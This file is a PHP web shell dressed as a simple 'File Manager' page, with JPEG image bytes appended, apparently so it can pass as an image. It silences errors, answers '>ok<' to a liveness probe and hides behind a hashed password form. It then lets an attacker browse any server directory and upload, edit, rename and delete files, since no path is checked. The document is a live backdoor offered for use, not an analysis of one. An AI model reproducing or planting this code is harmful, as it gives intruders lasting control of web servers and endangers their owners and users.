<?php ?><?php error_reporting(0); if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
if (function_exists('session_start')) { session_start(); if (!isset($_SESSION['secretyt'])) { $_SESSION['secretyt'] = false; } if (!$_SESSION['secretyt']) { if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) == 'cf4e456bd6653b84aef68f8576ab5ccad53c2b343711c57aaaf8931b24b1858f') {
      $_SESSION['secretyt'] = true; } else { die('<html> <head> <meta charset="utf-8"> <title></title> <style type="text/css"> body {padding:10px} input { padding: 2px; display:inline-block; margin-right: 5px; } </style> </head> <body> <form action="" method="post" accept-charset="utf-8"> <input type="password" name="pwdyt" value="" placeholder="passwd"> <input type="submit" name="submit" value="submit"> </form> </body> </html>'); } } }
?>
<?php
// Menangani path folder yang dipilih
$directory = isset($_GET['folder']) ? $_GET['folder'] : __DIR__; // Default ke root jika tidak ada folder yang dipilih
$filesAndFolders = array_diff(scandir($directory), array('..', '.'));  // Mengambil semua file dan folder

// Pisahkan folder dan file
$folders = [];
$files = [];
foreach ($filesAndFolders as $item) {
    if (is_dir($directory . '/' . $item)) {
        $folders[] = $item;  // Menambahkan folder
    } else {
        $files[] = $item;  // Menambahkan file
    }
}

// Gabungkan folder dan file, dengan folder di atas
$filesAndFolders = array_merge($folders, $files);

// Variabel untuk mengedit file
$fileToEdit = '';
$fileContent = '';

// Fungsi untuk membuat file baru
if (isset($_POST['createFile'])) {
    $newFileName = $directory . '/' . $_POST['fileName'] . '.txt';
    if (!file_exists($newFileName)) {
        touch($newFileName);  // Membuat file baru
        echo "<div class='alert success'>File baru berhasil dibuat: " . $_POST['fileName'] . ".txt</div>";
    } else {
        echo "<div class='alert error'>File sudah ada!</div>";
    }
}

// Fungsi untuk membuat folder baru
if (isset($_POST['createFolder'])) {
    $newFolderName = $directory . '/' . $_POST['folderName'];
    if (!is_dir($newFolderName)) {
        mkdir($newFolderName);  // Membuat folder baru
        echo "<div class='alert success'>Folder baru berhasil dibuat: " . $_POST['folderName'] . "</div>";
    } else {
        echo "<div class='alert error'>Folder sudah ada!</div>";
    }
}

// Fungsi untuk meng-upload file
if (isset($_POST['upload'])) {
    $fileToUpload = $_FILES['fileToUpload'];
    $targetFile = $directory . '/' . basename($fileToUpload["name"]);

    // Cek apakah ada error saat upload
    if ($fileToUpload["error"] != 0) {
        echo "<div class='alert error'>Terjadi kesalahan saat meng-upload file. Error code: " . $fileToUpload["error"] . "</div>";
    } elseif (move_uploaded_file($fileToUpload["tmp_name"], $targetFile)) {
        echo "<div class='alert success'>File " . htmlspecialchars($fileToUpload["name"]) . " berhasil di-upload.</div>";
    } else {
        echo "<div class='alert error'>Terjadi kesalahan saat meng-upload file.</div>";
    }
}

// Fungsi untuk mengganti nama file atau folder
if (isset($_POST['rename'])) {
    $oldName = $directory . '/' . $_POST['oldName'];
    $newName = $directory . '/' . $_POST['newName'];

    // Cek jika file atau folder baru sudah ada
    if (file_exists($newName)) {
        echo "<div class='alert error'>File atau folder dengan nama ini sudah ada.</div>";
    } else {
        // Rename tanpa menambahkan ekstensi apapun
        if (rename($oldName, $newName)) {
            echo "<div class='alert success'>Nama berhasil diubah.</div>";
        } else {
            echo "<div class='alert error'>Gagal mengubah nama.</div>";
        }
    }
}

// Fungsi untuk menghapus file atau folder
if (isset($_POST['delete'])) {
    $nameToDelete = $directory . '/' . $_POST['nameToDelete'];
    if (is_dir($nameToDelete)) {
        rmdir($nameToDelete);  // Menghapus folder
    } else {
        unlink($nameToDelete);  // Menghapus file
    }
    echo "<div class='alert success'>File atau folder berhasil dihapus.</div>";
}

// Fungsi untuk mengedit file
if (isset($_POST['edit'])) {
    $fileToEdit = $_POST['fileNameToEdit'];
    $fileContent = file_get_contents($directory . '/' . $fileToEdit);
}

// Fungsi untuk menyimpan perubahan file
if (isset($_POST['saveEdit'])) {
    $fileNameToEdit = $_POST['fileNameToEdit'];
    $newContent = $_POST['content'];

    // Periksa apakah konten baru kosong
    if (empty($newContent)) {
        echo "<div class='alert error'>Konten file tidak boleh kosong!</div>";
    } else {
        // Periksa apakah file yang akan diedit ada
        $filePath = $directory . '/' . $fileNameToEdit;
        if (file_exists($filePath)) {
            // Simpan perubahan ke file
            if (file_put_contents($filePath, $newContent) !== false) {
                echo "<div class='alert success'>Perubahan berhasil disimpan.</div>";
            } else {
                echo "<div class='alert error'>Gagal menyimpan perubahan.</div>";
            }
        } else {
            echo "<div class='alert error'>File tidak ditemukan.</div>";
        }
    }
}

// Menangani tombol Back: jika ada folder yang dipilih, kembali ke folder sebelumnya
$parentDirectory = dirname($directory);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f0f4f8;
            color: #333;
            margin: 0;
            padding: 0;
        }
        .file-manager {
            display: flex;
            width: 100%;
            margin-top: 20px;
        }
        .sidebar {
            width: 20%;
            padding: 15px;
            background-color: #2c3e50;
            color: #fff;
            box-shadow: 2px 0 5px rgba(0, 0, 0, 0.1);
        }
        .sidebar h3 {
            color: #ecf0f1;
        }
        .sidebar input, .sidebar button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            font-size: 14px;
            border: none;
            border-radius: 4px;
        }
        .sidebar button {
            background-color: #3498db;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .sidebar button:hover {
            background-color: #2980b9;
        }
        .main-content {
            width: 80%;
            padding: 20px;
        }
        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            background-color: #fff;
            transition: background-color 0.3s;
        }
        .file-item:hover {
            background-color: #f9f9f9;
        }
        .file-item a {
            text-decoration: none;
            color: #3498db;
        }
        .actions {
            display: flex;
            gap: 10px;
        }
        .actions button {
            padding: 5px 10px;
            font-size: 12px;
            border: 1px solid #ccc;
            border-radius: 4px;
            background-color: #2ecc71;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .actions button:hover {
            background-color: #27ae60;
        }
        .actions button.delete {
            background-color: #e74c3c;
        }
        .actions button.delete:hover {
            background-color: #c0392b;
        }
        .alert {
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
            font-size: 14px;
        }
        .alert.success {
            background-color: #2ecc71;
            color: white;
        }
        .alert.error {
            background-color: #e74c3c;
            color: white;
        }
        textarea {
            width: 100%;
            height: 300px;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 10px;
            font-size: 14px;
        }
    </style>
</head>
<body>

<div class="file-manager">
    <!-- Sidebar untuk membuat file dan folder -->
    <div class="sidebar">
        <h3>Create File</h3>
        <form action="" method="post">
            <input type="text" name="fileName" placeholder="Nama File" required>
            <button type="submit" name="createFile">Create File</button>
        </form>

        <h3>Create Folder</h3>
        <form action="" method="post">
            <input type="text" name="folderName" placeholder="Nama Folder" required>
            <button type="submit" name="createFolder">Create Folder</button>
        </form>

        <h3>Upload File</h3>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" required>
            <button type="submit" name="upload">Upload</button>
        </form>
    </div>

    <!-- Konten Utama -->
    <div class="main-content">
        <h1>File Manager</h1>

        <!-- Menampilkan path folder yang sedang aktif -->
        <p><strong>Current Directory: </strong>
            <?php
            $parts = explode(DIRECTORY_SEPARATOR, $directory);
            $path = '';
            foreach ($parts as $index => $part) {
                $path .= $part;
                if ($index < count($parts) - 1) {
                    echo "<a href=\"?folder=" . urlencode($path) . "\">" . $part . "</a> / ";
                } else {
                    echo $part;
                }
                $path .= DIRECTORY_SEPARATOR;
            }
            ?>
        </p>

        <!-- Navigasi ke folder sebelumnya -->
        <?php if (isset($_GET['folder']) && $_GET['folder'] != __DIR__): ?>
            <a href="?folder=<?= urlencode($parentDirectory) ?>">Back to <?= basename($parentDirectory) ?></a>
        <?php endif; ?>

        <div class="file-list">
            <?php foreach ($filesAndFolders as $item): ?>
                <div class="file-item">
                    <?php if (is_dir($directory . '/' . $item)): ?>
                        <strong>Folder: </strong>
                        <a href="?folder=<?= urlencode($directory . '/' . $item) ?>"><?= $item ?></a>
                        <div class="actions">
                            <form action="" method="post" style="display: inline;">
                                <input type="hidden" name="oldName" value="<?= $item ?>">
                                <input type="text" name="newName" placeholder="New Name" required>
                                <button type="submit" name="rename">Rename</button>
                            </form>
                            <form action="" method="post" style="display: inline;">
                                <input type="hidden" name="nameToDelete" value="<?= $item ?>">
                                <button type="submit" name="delete" class="delete">Delete</button>
                            </form>
                        </div>
                    <?php else: ?>
                        <strong>File: </strong>
                        <a href="?file=<?= urlencode($item) ?>"><?= $item ?></a>
                        <div class="actions">
                            <form action="" method="post" style="display: inline;">
                                <input type="hidden" name="oldName" value="<?= $item ?>">
                                <input type="text" name="newName" placeholder="New Name" required>
                                <button type="submit" name="rename">Rename</button>
                            </form>
                            <form action="" method="post" style="display: inline;">
                                <input type="hidden" name="fileNameToEdit" value="<?= $item ?>">
                                <button type="submit" name="edit">Edit</button>
                            </form>
                            <form action="" method="post" style="display: inline;">
                                <input type="hidden" name="nameToDelete" value="<?= $item ?>">
                                <button type="submit" name="delete" class="delete">Delete</button>
                            </form>
                        </div>
                    <?php endif; ?>
                </div>
            <?php endforeach; ?>
        </div>

        <!-- Menampilkan dan mengedit isi file -->
        <?php if ($fileToEdit): ?>
            <h2>Edit File: <?= htmlspecialchars($fileToEdit) ?></h2>
            <form action="" method="post">
                <textarea name="content" rows="10"><?= htmlspecialchars($fileContent) ?></textarea><br>
                <input type="hidden" name="fileNameToEdit" value="<?= htmlspecialchars($fileToEdit) ?>">
                <button type="submit" name="saveEdit">Save Changes</button>
            </form>
        <?php endif; ?>
    </div>
</div>

</body>
</html>

 ���C�		



	
���C�����"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?�����N����m?����j����EP��
